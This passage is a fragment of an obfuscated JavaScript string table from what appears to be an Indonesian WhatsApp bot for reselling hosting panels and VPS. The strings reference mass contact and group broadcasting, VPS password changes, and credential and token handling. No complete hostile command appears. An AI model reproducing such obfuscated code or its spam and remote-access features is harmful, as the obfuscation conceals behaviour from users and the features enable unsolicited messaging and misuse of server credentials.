        '\x20.ɪɴsᴛᴀʟʟᴘ',
        './akunpane',
        '3|1|2|4|0',
        ',\x20sᴇʟᴀɪɴ\x20ɪ',
        '\x20ᴀɪᴍɪ\x20<\x20ᴍʏ',
        '10gb-v2',
        'eHkcR',
        'd\x20respon\x20*',
        'MrGOJ',
        '\x20↝\x20.ᴅᴇʟᴅʀᴏ',
        'blok',
        '━━━━━\x20`ᴏᴛʜ',
        '\x0a\x0a*Detail\x20',
        '4GaRjwB',
        'ғᴏʀᴍᴀᴛɪᴏɴ\x20',
        'gouRY',
        'ᴋᴘᴀɴᴇʟ\x0a│\x20↝',
        'qAOWj',
        'ᴇʟ\x20ʟᴀɪɴɴʏᴀ',
        'r\x20Panel',
        '6285###',
        'push',
        'emtQm',
        'lLNDQ',
        'bmScU',
        'sʜᴇʀᴇ\x20<\x20ᴅᴇ',
        '\x0a┗━━━━━━━━',
        'rtanyaan&m',
        '\x20━━━━━\x0a│\x20↝',
        'BkHex',
        'n\x2015\x20hari\x20',
        'nbHZB',
        '\x20||\x20Durati',
        'Rp8000',
        'TBsaK',
        'hari\x20(1x\x20r',
        'embuka\x20blo',
        'DUxHC',
        '\x0achpasswd:',
        'judul',
        'ai-prompt?',
        'grup\x20lain!',
        '\x0a\x0a*Marketp',
        'jpm2',
        '*\x20kedalam\x20',
        'nGaao',
        '𝖱𝖵𝖤𝖱\x20𝖳𝖤𝖱𝖩𝖠',
        'i\x20pembelia',
        'NativeFlow',
        '│\x20↝\x20.ᴊᴘᴍsʟ',
        '.deladmin-',
        'fgXqA',
        'wsHGL',
        'press\x20ente',
        'ltrwJ',
        'json',
        '\x20↝\x20.4ɢʙ-ᴠ2',
        '*Data\x20Akun',
        '\x20sebaik\x20mu',
        'database/l',
        'deldroplet',
        'GyLnz',
        'p.net',
        'LItrf',
        'payment',
        'QMhlO',
        '\x0a*乂\x20INFORM',
        '\x20.8ɢʙ-ᴠ2\x0a│',
        '#ff2414',
        'thsSF',
        'yatakan\x20ti',
        'hkontak\x20Si',
        '\x20dikirim\x20k',
        'groups',
        'encrypthar',
        'bJJxa',
        'xxECE',
        'XqqNV',
        'cRxRC',
        'RAM\x203GB\x20|\x20',
        'sWnnz',
        '━\x20`ɢʀᴏᴜᴘ\x20ᴍ',
        'vrSwX',
        'at\x20melakuk',
        'creds.json',
        '3|0|1|2|4',
        'grup\x20ini\x20s',
        'a\x20hapus,\x20k',
        'vjzHN',
        'XObqM',
        '\x20ɪɴғᴏʀᴍᴀsɪ',
        'd-images',
        '\x0a│\x20↝\x20.ᴀᴅᴅ\x0a',
        'SMhDs',
        'ᴏᴏᴋ\x0a│\x20↝\x20.ᴄ',
        'ess\x20for\x20th',
        '*\x20Ram\x20Unli',
        '\x20GB\x20:\x20Rp30',
        'Tidak',
        'idSaluran',
        '\x20CPU\x204',
        'DavBh',
        '3\x0a│\x20↝\x20.ʏᴛᴍ',
        '.batalbeli',
        '\x0a│\x20↝\x20ᴄʀᴇᴀᴛ',
        '&isVideo=t',
        '/zipball',
        'qDpjU',
        'ngirim\x20not',
        'uptime',
        'tureUrl',
        '*antilink*',
        'Status\x20aks',
        'ktif!',
        'file',
        'fWOGi',
        'Cmd\x20respon',
        'mute*\x20di\x20g',
        'ERVERIFIKA',
        'ma\x20channel',
        'chat\x0aTotal',
        ')\x0a│\x20↝\x20ᴛʏᴘᴇ',
        'Rp25.000',
        'p6000\x0a\x0a*\x20R',
        '\x0a\x0a*🔵\x20INFOR',
        'Pilih\x20Spes',
        'apus!',
        'fHuAo',
        'u\x20&\x20Jangan',
        'instaltema',
        'idak\x20aktif',
        '*\x0a*\x20',
        'Fcywy',
        'msnUe',
        'Starting\x20🔥',
        'tWFCW',
        'd/igdl?url',
        'aiqTa',
        '\x20})()',
        'hostname',
        '2gb-v2',
        'Pilih\x20Paym',
        'TZjcH',
        '{\x22display_',
        'ly\x20pesanny',
        'exp',
        'ᴇᴛɪᴍɢᴍᴇɴᴜ\x0a',
        'lXpPk',
        'ɴᴄᴀɴɢ\x20ᴜɴᴛᴜ',
        '\x20Kedalam\x20G',
        'database\x20r',
        'announceme',
        'ile',
        'AN\x20BERHASI',
        '6gb\x20',
        'VsDcj',
        '&\x20Ketentua',
        'NENRA',
        'stringify',
        'cxndK',
        'ER*\x0a\x0a*•\x20Pl',
        'readsw',
        'blgc',
        'ᴘ\x20ᴊᴇᴅᴀ\x205\x20ᴍ',
        'hSxRj',
        'rccTA',
        'Pushkontak',
        'Sukses\x20',
        'Otomatis\x20A',
        'ᴛ\x20>\x0a┗━━━━━',
        'bvyba',
        'Node\x20By\x20Sk',
        'zepqy',
        'fWAMB',
        'Reply\x20file',
        'BwLVD',
        'an!',
        'nnWJD',
        's\x20pembayar',
        'transaksi\x20',
        'IBAOd',
        'GB\x20:\x20Rp200',
        'GrocB',
        'PQyaa',
        're.com/cli',
        '\x20ini',
        'path',
        'watchFile',
        '↝\x20.ᴅᴇʟᴀᴅᴍɪ',
        'startup',
        'wId',
        'lGaIY',
        'for\x20the\x20in',
        'CSVtu',
        '*Blacklist',
        'dUppU',
        'from',
        's-4vcpu-8g',
        'start\x20wing',
        'mp4',
        '00\x0a\x0a*\x20Ram\x20',
        'i\x20dalam\x20pr',
        'ktif*',
        '\x0a>\x20PANEL\x20T',
        'saweria',
        '1gb',
        'WhatsApp_*',
        'hasil\x20diki',
        '1|2|0|3|4',
        'DHUgY',
        'Owner',
        '\x0a\x0a╭*Syarat',
        'Provide\x20th',
        'wxsro',
        'FpYjq',
        'case\x20\x22',
        'an❗\x20:*\x0a│*\x20',
        'PrgmT',
        'eTXci',
        'vTEUW',
        'BnxXx',
        'igital\x20Oce',
        'berhasil\x20d',
        'xCXJu',
        'user',
        'ɢʙ-ᴠ2\x0a│\x20↝\x20',
        'VLngj',
        'UILD*\x0aIP\x20V',
        'min\x20Panel\x0a',
        'cQSjX',
        '\x20.ᴀᴅᴅsᴇʟʟᴇ',
        'EbLBG',
        '\x20bukan\x20own',
        'membuat\x20ad',
        '│\x20↝\x20.2ɢʙ-ᴠ',
        'Bearer\x20',
        'pay',
        'ᴘᴀɴᴇʟ-ᴠ2\x20\x0a',
        '*•\x20Expired',
        'https://gi',
        'errors',
        'HXDXv',
        'installtem',
        'tiktok',
        'https://bo',
        'send',
        'mtLzQ',
        'aKQsQ',
        'tLUXk',
        'OlRoo',
        'quoted',
        '|3|23|13|1',
        'NGWYK',
        'JmFNx',
        'membuat\x20fi',
        'download',
        'script\x20han',
        '*All\x20Trans',
        'Vps\x20(Virtu',
        'attributes',
        'KSIUL',
        'ncAUh',
        'mKvGC',
        '\x20Ini\x20⬇️',
        'BCGtR',
        'NbWSs',
        '*Autotypin',
        'WVGCk',
        'media',
        'rESFn',
        'DyKfS',
        'RAM\x201GB\x20|\x20',
        'ᴇʀᴏʀ*\x20ʜᴀʀᴀ',
        'espon',
        'engganti\x20k',
        'fUUce',
        'GOPAY',
        'cta_url',
        'ʟ\x0a│\x20↝\x20.ᴘʀᴏ',
        'XKolz',
        'donesia\x20sa',
        'List\x20Scrip',
        'srBpm',
        '0\x20hari\x20(1x',
        'tambahan*\x0a',
        'CPU\x2060%',
        'Ram\x208GB\x20||',
        'ʟᴀʀ\x0a│\x20↝\x20.ɪ',
        '𝖫𝖤𝖱\x20𝖯𝖠𝖭𝖤𝖫\x20',
        'Unknown',
        'playvid',
        'panel\x20*',
        '\x20>\x0a│\x20↝\x20xᴇɴ',
        'nAqKt',
        'at\x20this\x20HT',
        'kthwp',
        'ozFOI',
        'tif!',
        'k\x20grup\x20✅',
        'jkeAy',
        'leave',
        'st*',
        'mPbSW',
        'n/javascri',
        'utf8',
        'networks',
        'listRespon',
        '9gb',
        'end',
        'olm]',
        'xDWaq',
        'jika\x20sudah',
        'opqrstuvwx',
        'cmd',
        'AM\x20(dalam\x20',
        '\x20False\x20}',
        '528702epmqvp',
        '\x0a*\x20Status\x20',
        'prompt=Sek',
        '𝟦\x20𝖩𝖠𝖣𝖨\x20𝖩𝖠𝖬',
        'SJmIj',
        'wrEly',
        'enambah\x20ow',
        'ᴅᴇᴍᴏᴛᴇ\x0a│\x20↝',
        'pon\x20Speed\x20',
        'jXmxF',
        'SMFFb',
        '1\x20bulan\x0a*\x20',
        'QuPjr',
        'upch2',
        '𝖬𝖠𝖭𝖤𝖭\x0a>\x20𝖲𝖤',
        'XmRyZ',
        'hQbLe',
        'PDpDF',
        'ntak\x20',
        '│\x20↝\x20.ʟɪsᴛᴀ',
        'Server\x20Vps',
        'CPU\x20160%',
        'NaHgP',
        'hat',
        'xeipe',
        '𝐂𝐫𝐞𝐚𝐭𝐞\x20𝐂𝐏𝐚',
        'opengc',
        'KzxbO',
        '6RGJCYUZ9W',
        '.deladmin\x20',
        'Fwcyh',
        'converter.',
        '\x0a*\x20*Source',
        'encrypt',
        '\x0a*•\x20Total\x20',
        'iBkZd',
        '\x20all\x20cmd\x20r',
        'panel\x20pter',
        'kti\x20chat\x20p',
        '\x0a*\x20*ID\x20:*\x20',
        'oto\x20profil',
        'DhCnq',
        'Kifrk',
        'andomly\x20ge',
        'pu\x204',
        'UQXZz',
        'n\x20wings\x20✅*',
        'odactyl',
        'applicatio',
        'app',
        'xbJPW',
        'tenode.sh)',
        '-ᴠ2\x0a│\x20↝\x20.9',
        'Jyrdt',
        'r\x20di\x20whats',
        'xXBrh',
        'YEqMD',
        'r1c1',
        'nel\x20✅*\x0aDat',
        'ername\x20:*\x20',
        'g*\x20sudah\x20a',
        'zyFHj',
        'ik\x20*.listr',
        'JRDNC',
        'RxTGg',
        'ᴊᴀɢᴀ\x20ɢʀᴜʙ\x20',
        '\x20MB\x0aCpu:\x20',
        'ʀsᴇssɪᴏɴ\x0a│',
        'k*\x20ke\x20dala',
        'indexOf',
        'ʟᴛᴇᴍᴀʙɪʟʟɪ',
        'yCSsq',
        '\x20Akan\x20Kelu',
        'profilePic',
        'Server',
        'vWaAB',
        'CT\x20ME*\x0a\x0a*_',
        'Private\x20🌟*',
        '\x20</>',
        'kun\x20admin\x20',
        'mIoIZ',
        'ᴘᴀɴᴇʟ\x20ᴍᴇɴᴜ',
        'pin',
        'oQgXx',
        'developerb',
        '*Instagram',
        'ZannR',
        'Ram\x202GB',
        'e\x20chat',
        'JuPDn',
        'match',
        '.ᴊᴘᴍ2\x0a│\x20↝\x20',
        'hidetag',
        'pwvps|toke',
        'enghapus\x20o',
        '\x0a\x20*乂\x20List\x20',
        '\x0a│\x20↝\x20sᴛᴀᴛᴜ',
        'reak)*/',
        'Rp7000\x0a\x0a*\x20',
        'im/reply\x20f',
        'QGPgo',
        'lfMIc',
        'ml.documen',
        'FCGTK',
        'XEkWx',
        'kZzwj',
        'APkpT',
        'AAMNA',
        '\x20𝗖𝗽𝗮𝗻𝗲𝗹\x20⌟',
        'ELL;type=V',
        'jpm',
        'legra.ph/f',
        'MYihc',
        '\x20ᴊɪᴋᴀ\x20sᴄ\x20*',
        '\x0aHostname:',
        'Pengikut\x20:',
        'nitial\x20adm',
        'First\x20name',
        '│\x20↝\x20.sᴇɴᴅᴛ',
        'blacklist',
        'kukan\x20rest',
        '.buyadp',
        'setppbot',
        'AmsJD',
        'll\x20panel',
        'FXKYK',
        '2|1|0|3|4',
        'ɪɴᴋɢᴄ\x0a┗━━━',
        'mbayaran\x20d',
        'P\x20Tidak\x20di',
        'HAmfR',
        'FglUc',
        'kTIYO',
        'join',
        'sRzlv',
        '*autopromo',
        'mute',
        'enghapus\x20s',
        'jimp',
        'yehEF',
        'exports',
        'all\x20owner\x20',
        'ɴ\x20ᴋᴇɴᴏɴ',
        'fikasi\x20Ser',
        'irim\x20notif',
        'ɴɴᴇʟ\x20ᴅᴇᴠᴇʟ',
        'CzmrB',
        'r*\x20pteroda',
        'ssword\x20:*\x20',
        '\x20↝\x20.ʟᴇᴀᴠᴇ\x0a',
        'ni\x20sudah\x20a',
        'jnrtI',
        'savekontak',
        'QqKKP',
        '2ɢʙ-ᴠ2\x0a│\x20↝',
        'a\x20akun\x20sud',
        'oanUt',
        'tps://www.',
        'qrisOrderK',
        'test',
        'ɴɪɢᴍᴀ\x0a│\x20↝\x20',
        'an\x20rebuild',
        'ikLyp',
        'vQRbm',
        '↝\x20.ʜᴀᴄᴋʙᴀᴄ',
        'AZduR',
        'values',
        'fSmVb',
        'am\x205\x20menit',
        'Pilih\x20Doma',
        'hasil\x20dimu',
        'if!',
        'he\x20panel\x20u',
        'Silahkan\x20P',
        '\x0a*PEMBAYAR',
        'bukan\x20view',
        '\x0a│\x20↝\x20.ᴀɴᴛɪ',
        '━━\x0a│\x20↝\x20.ᴛɪ',
        'edia\x0a',
        'respushkon',
        'ller.se)',
        'gLCDu',
        '&keyorkut=',
        'li*\x20untuk\x20',
        'remove',
        'totalmem',
        'ᴇsᴛɪ\x0a│\x20↝\x20.',
        'qibNJ',
        'enhance',
        '/api/clien',
        'chat.whats',
        'ost\x20passwo',
        '\x20bukan\x20res',
        'ᴅ\x20>\x0a│\x20↝\x20ғᴀ',
        'l\x20Pterodac',
        '\x20Rp8000\x0a\x0a*',
        'obfuscate',
        'iLuPh',
        '`ɪɴsᴛᴀʟʟᴇʀ',
        'chat*\x0a',
        'dmin\x20panel',
        'kukan\x20rebu',
        'nHdGc',
        'es!\x20Type:\x0a',
        'ᴛʜᴇ\x20ʙᴜᴛᴛᴏɴ',
        'k\x20*.listre',
        'delpanel',
        'ᴋᴛᴏᴋ\x0a│\x20↝\x20.',
        '\x0a│\x20↝\x20.ᴀᴜᴛᴏ',
        '\x20sertakan\x20',
        'sendContac',
        'am\x20channel',
        'ᴇɴᴜ`\x20\x20━━━━',
        '2/droplets',
        '\x20.sᴇᴛᴘᴘʙᴏᴛ',
        'function',
        'zkTyA',
        '227275RSMCbS',
        'PANEL\x208GB',
        'HjZfc',
        'nSrag',
        'OVO',
        'm\x20:\x20*',
        'bMgSf',
        'IBJNk',
        '3gb\x20',
        'SHnir',
        'GkSYx',
        '\x20melewati\x20',
        'eZWXZ',
        'oJUaW',
        'bWqHO',
        'yqMOn',
        'installpan',
        'ATeIv',
        'https://',
        'fRgia',
        'qlHiI',
        'FUbUZ',
        'i\x205\x20menit\x20',
        'occgU',
        'vBdsM',
        'maling\x20sc,',
        'shortlink-',
        'oEFfu',
        'sᴛᴀʟʟᴘᴀɴᴇʟ',
        'il\x20dibuat!',
        'AbqDh',
        '\x20dibuat\x20✅\x0a',
        'Set\x20the\x20FQ',
        'r\x20install\x20',
        'TBkxx',
        'oivTM',
        'kun\x20Panel\x20',
        'ulHxi',
        'YbxEq',
        'ᴀʏ\x0a│\x20↝\x20.ᴘʟ',
        'arian\x20foto',
        'packname',
        'esponse*\x0a',
        'yurl.com*\x0a',
        'Fzyxd',
        'eplace)\x0a╰*',
        '\x20:*\x20\x0aQris\x20',
        'List\x20dropl',
        'KSoTO',
        'fJNOO',
        'pXXCQ',
        'Script\x20Bot',
        'ddress)',
        'njalankan\x20',
        'KqTCe',
        'KazHw',
        'dlpii',
        'kdZsj',
        'nyurl.com/',
        'tnFtH',
        'ild\x20VPS\x20:\x20',
        '\x0a*\x20*Cmd\x20:*',
        '\x0a│\x20↝\x20.5ɢʙ-',
        '\x20.ʀᴇsᴛᴀʀᴛʙ',
        'rIdWM',
        'UrQBU',
        'ram',
        'urfXe',
        '\x20dalam\x20cha',
        's-2vcpu-2g',
        'ᴜʙᴜʙ\x20>\x0a│\x20↝',
        'YTFTF',
        '\x0a\x20*•\x20Total',
        'eskripsi\x20l',
        '𝗖𝗽𝗮𝗻𝗲𝗹',
        '\x20ke\x20',
        '*\x20server\x20p',
        'iHbRk',
        'ception',
        'CPU\x20140%',
        '.zip',
        'gwdea',
        '/api/appli',
        '.buysc\x202',
        '\x0a\x20*•\x20Baran',
        'rAJBx',
        'ts/',
        'hHett',
        'iUaeb',
        'XDTzR',
        '\x20Ke\x20',
        'now\x20what\x20y',
        'Ram\x205GB',
        '_restart\x20s',
        '*welcome*\x20',
        'ib\x20bawa\x20bu',
        'DbIjd',
        '*\x20*Title\x20:',
        'WxukA',
        'nGKne',
        'thumbnail',
        'acroA',
        'BsHDP',
        'DcXUI',
        'RAM\x204GB\x20|\x20',
        'jauwI',
        'rup',
        'pfymh',
        'vyVOw',
        'cheerio',
        '\x0a*\x20*Total\x20',
        '*Autoread*',
        'ɪ\x20ɪɴғᴏʀᴍᴀs',
        'xrXqA',
        'ᴛsᴄ\x0a│\x20↝\x20.ɢ',
        'ᴛᴀʟᴏᴄᴇᴀɴ\x20ᴍ',
        'XjCZM',
        'LxPlY',
        'ᴇʀ\x20ᴍᴇɴᴜ`\x20\x20',
        'ple\x20Bot\x20V4',
        'yJbkJ',
        'XfcCf',
        'ama\x20node:\x20',
        'single_sel',
        'buypanel',
        'sᴡᴛ\x20<\x20ɢᴏᴅ\x20',
        'VOWMp',
        'gghdw',
        'current_st',
        'n/zip',
        'nTpHk',
        'an\x20sampah\x20',
        'n\x20data\x20ini',
        '\x0a\x20*Example',
        'fzjdr',
        'SYJhH',
        'listgc',
        'JgcPH',
        '.org',
        'ᴄʜᴀɴɴᴇʟ\x0a│\x20',
        'ɢᴀ\x20ʙᴏᴛ\x20ᴘᴇɴ',
        'matis\x20meng',
        '𝖵𝖤𝖱\x20𝖳𝖤𝖱𝖩𝖠𝖦',
        '</>',
        'npm\x20start',
        't\x20Penjual\x22',
        'RVbqG',
        'KLMNOPQRST',
        'at\x20menghap',
        'wUKuj',
        'ils',
        'ʀ\x0a│\x20↝\x20.ᴅᴇʟ',
        'e-now',
        'ZLIAS',
        'KDarp',
        'Promote',
        'Wlykv',
        'hydratedTe',
        'kiran\x20@',
        'gRCSh',
        'POST',
        '\x20&&\x20system',
        '[1-2]\x20then',
        'd/ytmp4?ur',
        'ᴘᴏɴ\x0a│\x20↝\x20.ᴅ',
        'fniGa',
        'happymod?q',
        'xGlcN',
        'NwInD',
        'ota',
        '04-x64',
        'HbVfo',
        'uat\x20VPS:\x20',
        'PTrWc',
        '𝖠𝖭𝖤𝖭\x0a>\x20𝖲𝖤𝖱',
        'si*\x20sudah\x20',
        'yGCvE',
        'PxXBA',
        './database',
        'aRgzN',
        'EVOURTH\x0a>\x20',
        'ᴠᴇxxᴜᴢᴢ\x20<\x20',
        'figure\x20Let',
        'ntak\x20telah',
        '\x0a*\x20*ATAS\x20N',
        'adPCD',
        'remium.jso',
        'enambah\x20re',
        'mVtPh',
        'aMZIv',
        '\x20Ke\x20*',
        'xouvq',
        'bgCyan',
        'RjqLC',
        'ampah',
        'panjang',
        'Ram\x204\x20&\x20Cp',
        'astelar',
        '*\x20tidak\x20di',
        'HNFbq',
        'format',
        'ʜᴀʀᴀᴘ\x20ᴜɴᴛᴜ',
        'QQjsK',
        'menjalanka',
        'KgvWw',
        'PegDu',
        'pnagM',
        'SIL\x20DI\x20REB',
        'Select\x20tim',
        'nkan\x20Wings',
        'lace',
        'translate-',
        'ofmjd',
        'FfdmI',
        'FEEIt',
        'mediafire',
        'Error!\x20vid',
        'Remove\x20all',
        'subject',
        'vIzwo',
        'chat',
        'MiNTB',
        'BiRzE',
        '𝗥𝘆𝘇𝘇𝗜𝘀𝗛𝗲𝗿𝗲',
        'mxlhi',
        'Garansi\x20pe',
        'ᴛɪᴅᴀᴋ\x20ʀᴀᴡᴀ',
        'listpanel-',
        'Rp12.000',
        'state',
        'cipantsUpd',
        'rVBaJ',
        '\x0a\x0a*Testimo',
        'Pesan\x20itu\x20',
        'XgJAi',
        'mRieB',
        'asGzZ',
        'ʜᴀᴅᴇ\x0a│\x20↝\x20.',
        'sᴛᴀʟʟᴛᴇᴍᴀ\x0a',
        'hsskZ',
        './@hardenc',
        'vate\x20chat',
        'n\x20account',
        'g\x20:*\x20',
        'ile/a059a6',
        '\x0a*\x20*Author',
        'GNihJ',
        'nsi\x20wajib\x20',
        'ᴅᴏɴᴇ\x0a│\x20↝\x20.',
        'Yihjk',
        'ponseMessa',
        'PJHOe',
        '𝖯𝖤𝖪\x20𝖵𝖯𝖲\x20𝟣𝟨',
        'ɪᴅᴇ\x0a│\x20↝\x20.ᴊ',
        'jbIUC',
        '0\x20Seconds',
        'rue',
        'g*\x20tidak\x20a',
        'QRIS\x20Pemba',
        'IcjBk',
        'p.com/',
        'VrWsT',
        'bIUzE',
        'pLGuQ',
        'Done\x20✅',
        'oaVuH',
        'ᴀɴᴇʟ-ᴠ2\x0a│\x20',
        'rgkON',
        'Ram\x208\x20&\x20Cp',
        'a734ed202c',
        'selectedRo',
        'mess',
        'buyvps',
        'bWcYi',
        'pyqQT',
        's|panel.co',
        'apiSimpleB',
        '©\x20Powered\x20',
        '\x20Pembayara',
        'ode.exampl',
        'tpAhk',
        'break',
        'rodactyl\x0a\x20',
        'aksi\x20Open\x20',
        '\x0a*\x20*Nama\x20:',
        'textInfo',
        'ets',
        'encrypt\x20ha',
        'postimages',
        '✅*\x0aFile\x20ko',
        'mFzMm',
        '\x0a│\x20↝\x20ʀʏᴢᴢɪ',
        'concat',
        'url',
        '`\x20\x20━━━━━\x0a│',
        'ᴄᴀᴅᴍɪɴ-ᴠ2\x20',
        'tkkHw',
        'at\x20menjawa',
        'i\x20sudah\x20ak',
        'ama\x20lokasi',
        'unblok',
        'qrzfu',
        ')*\x20\x0a*👤\x20Use',
        'ssage',
        'totalDropl',
        'UpJNh',
        '\x20.ᴅᴇʟᴘᴀɴᴇʟ',
        'AKAN*\x0a>\x20SC',
        '\x20Cpu\x20Vps',
        '*Capcut\x20Do',
        '*install*\x20',
        'YjsgQ',
        'ra\x20Menjala',
        'CBYWl',
        'e6b76810ac',
        'apatkan\x20da',
        'ᴄᴀᴅᴍɪɴ\x0a│\x20↝',
        'wa.me/6281',
        'ptkyo',
        'ySlvp',
        'Auzjx',
        '\x20akan\x20saya',
        '*uninstall',
        'ple\x20Bot\x20V5',
        '\x20sudah\x20akt',
        '.buyvps\x201',
        '\x0a\x0a*🌐\x20Spesi',
        'QSsSe',
        'yts',
        'CjOaz',
        'ᴏʀᴇᴀᴅsᴡ\x0a│\x20',
        '\x0a\x0a*Note\x20:*',
        '\x20Selsai\x20✅*',
        '\x20ᴍᴇɴᴜ`\x20━━━',
        'dia',
        'PMCCq',
        '\x0a\x0a*Syarat\x20',
        'HEAD',
        'ya\x20bisa\x20di',
        'Rp9000',
        'splice',
        'MQtvS',
        '.ᴀᴘᴋᴍᴏᴅ\x0a│\x20',
        'p\x20ini',
        '\x20join\x20chan',
        'sXPbn',
        'block',
        ',\x20jika\x20sud',
        '\x0a*\x20*Passwo',
        'Ogcgg',
        'PnAcL',
        '.r16c4\x20',
        'dtWZh',
        'ABCDEFGHIJ',
        'lnZip',
        'ᴀᴅᴠɪᴇᴡᴏɴᴄᴇ',
        'ʙɪʟʟɪɴɢ\x0a│\x20',
        'mpel',
        'sApp',
        'xaIqC',
        '\x201-10\x20meni',
        'brat',
        'yarn.lock',
        'r\x20to\x20use\x20r',
        'ings',
        'query',
        'IP!',
        'Youtube\x20Se',
        '\x20CPU\x0aOS:\x20',
        'all\x20resell',
        'b\x20semua\x20pe',
        '\x20✅*',
        'SFXPP',
        'ah\x20dikirim',
        'crypto',
        'a\x20ini\x20seba',
        'QiVMO',
        '5gb\x20',
        '200',
        '\x20dan\x20jika\x20',
        '𝗿𝗲/*^/*($b',
        'S\x20berhasil',
        'e*,\x20\x0aTungg',
        '┏━━━━━\x20\x20`ᴘ',
        'Nomor\x20',
        'antilink2*',
        'server\x20pan',
        'List\x20Serve',
        'qrImageUrl',
        'RlVYZ',
        'eCnFy',
        '2/account',
        'uploadFrom',
        'ykuUc',
        'OUNSN',
        'author',
        'QpFGC',
        'z-V5',
        '\x0a\x0a*\x20Ram\x201G',
        '\x20foto',
        'yTXjL',
        'g\x20:*\x20Admin',
        'CFIzq',
        'vxEuu',
        'relayMessa',
        'tyl\x20✅',
        '│\x20↝\x20.ғᴀᴄᴇʙ',
        'mbayaran\x20h',
        'yBwJs',
        'n\x20complete',
        ')*\x20\x0a┃*👤\x20Us',
        'closegc',
        'Rp35.000',
        '\x20ʀᴇsᴇʟʟᴇʀ\x20',
        'created_at',
        'DANA',
        'nfiguratio',
        'yHahI',
        'ZAWXd',
        'irwoN',
        'subscriber',
        'OrderKuota',
        'ᴜᴘᴛɪᴍᴇ\x20ᴠᴘs',
        'wnloader\x20✅',
        'ABFLP',
        'UGPJx',
        'erikut\x20det',
        'Rp7000',
        '2|0|4|3|1|',
        'at.whatsap',
        'membawa\x20bu',
        '\x20pterodact',
        'ample.com',
        '\x20Simpan\x20da',
        'fromCharCo',
        'rd:\x20',
        'md\x20respon\x20',
        'cean.com/v',
        'kirimkan\x20b',
        'welcome',
        'dbdBs',
        'abiqy',
        'selectedId',
        'ired\x20:*\x205\x20',
        'YSaWL',
        'XvxSL',
        'YNfse',
        '𝖣𝖠𝖭\x20𝖭𝖮\x20𝖣𝖤𝖫',
        'jhjVU',
        'Qdiqu',
        '*VPS\x20BERHA',
        'Ram\x20:*\x20',
        'salahan:\x20',
        'KYGrv',
        'gKgtM',
        '\x0a*_Telegra',
        'namaSc',
        'aFZNm',
        'ping',
        'lah\x20Pesan\x20',
        'buyadp',
        'ler',
        '\x20CPU\x20220%',
        'List\x20Domai',
        'CBTtx',
        '*jpmslide*',
        'g*\x20pteroda',
        '\x0aʜᴀʀᴀᴘ\x20ᴜɴᴛ',
        'all\x20group\x20',
        'ᴀᴜᴛᴏᴘʀᴏᴍᴏs',
        'WjKiA',
        '4297893\x0a',
        '[yes/no]',
        'HZmYg',
        'joingc',
        'ᴛᴀʟʟᴘᴀɴᴇʟ\x0a',
        'Type',
        'ent\x20Lain',
        'eokFl',
        'images',
        '\x0a│\x20↝\x20.ᴜɴɪɴ',
        '\x0a┏━━━━━\x20ɪɴ',
        '\x0a```Scan\x20q',
        'i\x20sebelumn',
        'Ram\x208\x20GB\x20:',
        'AGPyk',
        'droplet\x20ya',
        'CLReb',
        'ran\x20kamu.\x0a',
        'cZPWG',
        '\x0a│\x20↝\x20.ᴏᴘᴇɴ',
        '*List\x20Pane',
        'yluCp',
        'HpcEQ',
        'tGgNH',
        'ago',
        'efghijklmn',
        '━━━━━\x0a│\x20↝\x20',
        'BGvQn',
        'gxnjs',
        'randomized',
        'tis\x20mengir',
        'SPCLO',
        'caption',
        'ʟɪɴᴋ2\x0a│\x20↝\x20',
        'pWUOE',
        '\x20GB\x0aStatus',
        'r2c2',
        'uQfAe',
        'ilih\x20Panel',
        'readdirSyn',
        'i.skyzoped',
        'Nomor\x20tida',
        'Server\x20Pan',
        'hnGPv',
        'Tuwmp',
        'ZfcJJ',
        'bRdEd',
        'cvlYg',
        'oBNTN',
        'Ram\x201GB\x20||',
        'delown',
        'enghapus\x20r',
        'te\x20number\x20',
        'ma\x20billing',
        'ᴘ4\x0a│\x20↝\x20.ᴘʟ',
        'tyl',
        'wlhvW',
        'enambah\x20cm',
        'cHUWh',
        'eMessage',
        'nSxZE',
        '𝖦\x20𝖵𝖨𝖠\x20𝖳𝖤𝖫𝖤',
        'BEGIN:VCAR',
        'leanO',
        'XvFZu',
        'audio',
        'aingl',
        '*ᴇʀᴏʀ*\x20ʜᴀʀ',
        '\x20bahasa\x20In',
        'dmOAH',
        '/resources',
        '━\x0a│\x20↝\x20.ᴄᴠᴘ',
        'THGCG',
        'abase\x20resp',
        'subdomain',
        'H\x0a>\x20𝖱𝖤𝖲𝖤𝖫𝖫',
        'IAJNu',
        'AHUNM',
        'jpm\x20testim',
        'Droplet\x20ID',
        'configurew',
        'dalam\x20chan',
        'Aksi\x20resta',
        'MPuiV',
        '/actions',
        'PANEL\x2010GB',
        '\x0a\x20*•\x20Expir',
        '\x20bot!',
        'ZIMcc',
        'CEGKU',
        'FeDvq',
        'xhgif',
        'deladmin',
        '⌁⃰𝐂͢𝐏𝐚𝐧𝐞𝐥✨',
        'groupRevok',
        '*Hallo\x20dev',
        'OUmSg',
        'ing):',
        'apitoken',
        'ᴋᴜᴅᴇᴛᴀɢᴄ\x0a│',
        'BEcvD',
        'MlEKY',
        'bBQjF',
        'ZCpaZ',
        '\x20dimulai.\x20',
        'FoIGS',
        '\x0a*𝗥𝘆𝘇𝘇𝗜𝘀𝗛𝗲',
        'tkhGg',
        'ᴜᴋ\x20ᴊᴏɪɴ\x20ᴄʜ',
        'PANEL\x209GB',
        'Ybxyv',
        'nel\x20✅',
        'qLZgP',
        'eCXgK',
        'lPZph',
        's\x0a│\x20↝\x20.sɪs',
        'TkoDv',
        'ZpShT',
        'mplebot',
        'https://ap',
        'hkhvy',
        'atabase\x20(t',
        '↝\x20.ᴛʀᴀɴsʟᴀ',
        'HFtSb',
        '\x20owner!',
        '\x20pembayara',
        'jfgAF',
        'sult\x20From\x20',
        'ired\x20panel',
        'eExHx',
        'QqOlH',
        'ukFwH',
        'blue',
        'r\x20:*\x20',
        'Admin\x20Pane',
        'JqXBq',
        'Buat\x20Alloc',
        'EcSji',
        '#eb13f2',
        '\x0a\x0aTotal\x20dr',
        'nYTkM',
        'ɪᴅ\x0a│\x20↝\x20.ʀᴇ',
        'waUploadTo',
        'ʙᴇsᴛ\x20ғʀɪᴇɴ',
        'irimkan\x20bu',
        'am\x20MB):\x20',
        'Powered\x20By',
        'i\x20grup\x20ini',
        'eUTMD',
        'WUrrQ',
        'JaBjM',
        'IMWNS',
        '://t.me/ry',
        'AVVEJ',
        'flpVg',
        'ᴋ\x20ᴊᴏɪɴ\x20ᴄʜᴀ',
        'VDZMF',
        '━━━━\x20`ɪɴsᴛ',
        'cOfFP',
        '\x20[enter]\x20(',
        'pesannya',
        'si*',
        'OcsZN',
        'gbJRj',
